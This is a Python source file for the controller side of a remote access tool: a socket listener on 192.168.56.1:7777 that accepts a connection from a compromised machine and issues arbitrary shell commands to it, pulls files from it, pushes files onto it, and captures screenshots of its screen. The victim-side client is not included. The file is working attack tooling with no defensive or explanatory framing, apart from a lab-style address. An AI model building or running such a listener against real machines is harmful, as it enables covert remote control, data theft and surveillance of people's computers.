import sys
import base64
import socket

class Server:
    def __init__(self):
        self.server = None
        self.ip     = None
        self.target = None
        self.count  = 0

    # start server
    def upserver(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # ip and port reusable
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        # listening
        self.server.bind(('192.168.56.1', 7777))
        # listen 1 client
        self.server.listen(1)
        print(' - Server working, waiting connections . . . ')

        self.target, self.ip = self.server.accept()
        print(' - Connection stablished %s' %(str(self.ip[0])))

    # listening
    def shell(self):
        current_dir = self.targetDecode()

        while True:
            command = input("{}~#:" . format(current_dir))
            
            if command == "exit":
                self.exitCommand(command)

            elif command[:2] == 'cd':
                current_dir = self.cdCommand(command)
            
            elif command == '':
                pass
            
            elif command[:8] == "download":
                self.downloadCommand(command)

            elif command[:6] == "upload":
                self.uploadCommand(command)

            elif command[:10] == "screenshot":
                self.screenshotCommand(command)
            
            else:
                result = self.processCommand(command)

                if result == "1":
                    continue
                else:
                    self.printResult(result)

    # send str    
    def clientSend(self, command):
        self.target.send(command.encode('utf-8'))

    # print decoded str
    def printResult(self, result):
        print(result.decode(encoding='windows-1252'))

    # recieve decoded info
    def targetDecode(self):
        return self.target.recv(1024).decode('utf-8')

    # exit
    def exitCommand(self, command):
        self.clientSend(command)
        sys.exit()

    # list command
    def cdCommand(self, command):
        self.clientSend(command)

        return self.targetDecode()

    # download file command
    def downloadCommand(self, command):
        self.clientSend(command)
        with open(command[9:], 'wb') as file_download:
            data = self.target.recv(30000)
            file_download.write(base64.b64decode(data))

    # other commands
    def processCommand(self, command):
        self.clientSend(command)
        
        return self.target.recv(3000)

    # upload file command
    def uploadCommand(self, command):
        try:
            self.clientSend(command)
            with open(command[7:], 'rb') as file_upload:
                self.target.send(base64.b64encode(file_upload.read()))

        except Exception as e:
            print(e)
            print(" ---- Error on upload!!!")

    # close connection
    def close(self):
        self.server.close()

    # screenshot command
    def screenshotCommand(self, command):
        self.clientSend(command)
        with open("monitor-%d.png" % self.count, "wb") as screenshot:
            data = self.target.recv(10000000)
            data_decode = base64.b64decode(data)
            if data_decode == "fail":
                print("--- Error on screenshot")
            else:
                screenshot.write(data_decode)
                print("--- Screenshot done")
                self.count += 1